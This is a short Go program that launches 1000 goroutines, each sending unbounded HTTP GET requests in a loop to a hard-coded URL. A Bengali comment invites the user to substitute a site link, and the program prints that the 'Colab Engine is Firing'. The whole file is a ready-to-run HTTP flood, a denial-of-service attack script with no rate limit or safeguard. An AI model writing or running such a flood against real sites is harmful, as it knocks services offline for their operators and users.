package main
import (
    "fmt"
    "net/http"
    "time"
)
func main() {
    target := "https://myaura.xyz/" // এখানে তোমার সাইট লিঙ্ক দাও
    for i := 0; i < 1000; i++ {
        go func() {
            for {
                http.Get(target)
            }
        }()
    }
    fmt.Println("🚀 Colab Engine is Firing!")
    select {} 
}
